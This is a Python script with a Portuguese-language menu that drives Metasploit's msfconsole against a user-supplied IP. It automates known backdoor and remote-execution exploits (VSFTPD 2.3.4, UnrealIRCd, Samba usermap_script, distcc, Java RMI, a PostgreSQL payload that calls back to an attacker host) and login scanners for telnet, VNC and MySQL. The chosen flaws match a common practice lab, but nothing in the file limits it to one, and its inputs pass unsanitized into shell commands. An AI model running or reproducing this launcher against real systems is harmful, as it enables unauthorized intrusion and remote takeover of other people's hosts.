import os

def exploit_vsftpd(ip):
    os.system(f'''
    msfconsole -q -x "
    use exploit/unix/ftp/vsftpd_234_backdoor;
    set RHOSTS {ip};
    exploit;
    exit"
    ''')

def exploit_unreal_ircd(ip):
    os.system(f'''
    msfconsole -q -x "
    use exploit/unix/irc/unreal_ircd_3281_backdoor;
    set RHOSTS {ip};
    exploit;
    exit"
    ''')

def exploit_samba(ip):
    os.system(f'''
    msfconsole -q -x "
    use exploit/multi/samba/usermap_script;
    set RHOSTS {ip};
    exploit;
    exit"
    ''')

def exploit_distccd(ip):
    os.system(f'''
    msfconsole -q -x "
    use exploit/unix/misc/distcc_exec;
    set RHOSTS {ip};
    exploit;
    exit"
    ''')

def exploit_java_rmi(ip):
    os.system(f'''
    msfconsole -q -x "
    use exploit/multi/misc/java_rmi_server;
    set RHOSTS {ip};
    exploit;
    exit"
    ''')

def exploit_postgres_payload(ip, lhost):
    os.system(f'''
    msfconsole -q -x "
    use exploit/linux/postgres/postgres_payload;
    set RHOSTS {ip};
    set LHOST {lhost};
    exploit;
    exit"
    ''')

def exploit_telnet(ip):
    os.system(f'''
    msfconsole -q -x "
    use auxiliary/scanner/telnet/telnet_login;
    set RHOSTS {ip};
    exploit;
    exit"
    ''')

def exploit_vnc(ip):
    os.system(f'''
    msfconsole -q -x "
    use auxiliary/scanner/vnc/vnc_login;
    set RHOSTS {ip};
    exploit;
    exit"
    ''')

def exploit_rservices(ip):
    os.system(f'''
    msfconsole -q -x "
    use exploit/unix/rservices/rsh_client;
    set RHOSTS {ip};
    exploit;
    exit"
    ''')

def exploit_nfs(ip):
    os.system(f'''
    msfconsole -q -x "
    use auxiliary/scanner/nfs/nfsmount;
    set RHOSTS {ip};
    exploit;
    exit"
    ''')

def exploit_mysql(ip, username, password):
    os.system(f'''
    msfconsole -q -x "
    use auxiliary/scanner/mysql/mysql_login;
    set RHOSTS {ip};
    set USERNAME {username};
    set PASSWORD {password};
    exploit;
    exit"
    ''')

def main():
    while True:
        print("Escolha a vulnerabilidade para explorar:")
        print("1. VSFTPD v2.3.4 Backdoor (Porta 21)")
        print("2. UnrealIRCd 3.2.8.1 Backdoor (Porta 6667)")
        print("3. Samba 'username map script' (Porta 139)")
        print("4. DistCC Daemon Command Execution (Porta 3632)")
        print("5. Java RMI Server Insecure Default Configuration (Porta 1099)")
        print("6. PostgreSQL Payload Execution (Porta 5432)")
        print("7. Telnet Login (Porta 23)")
        print("8. VNC Authentication Bypass (Porta 5900)")
        print("9. RServices Unauthorized Access (Portas 512, 513, 514)")
        print("10. NFS Unauthorized Access (Porta 2049)")
        print("11. MySQL Login with Default Credentials (Porta 3306)")
        print("0. Sair")
        
        escolha = input("Opção: ")
        
        if escolha == '0':
            break
        elif escolha in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']:
            ip = input("Digite o endereço IP do alvo: ")
            if escolha == '1':
                exploit_vsftpd(ip)
            elif escolha == '2':
                exploit_unreal_ircd(ip)
            elif escolha == '3':
                exploit_samba(ip)
            elif escolha == '4':
                exploit_distccd(ip)
            elif escolha == '5':
                exploit_java_rmi(ip)
            elif escolha == '6':
                lhost = input("Digite o endereço IP do seu host (LHOST): ")
                exploit_postgres_payload(ip, lhost)
            elif escolha == '7':
                exploit_telnet(ip)
            elif escolha == '8':
                exploit_vnc(ip)
            elif escolha == '9':
                exploit_rservices(ip)
            elif escolha == '10':
                exploit_nfs(ip)
            elif escolha == '11':
                username = input("Digite o nome de usuário do MySQL: ")
                password = input("Digite a senha do MySQL: ")
                exploit_mysql(ip, username, password)
        else:
            print("Opção inválida. Tente novamente.")

if __name__ == "__main__":
    main()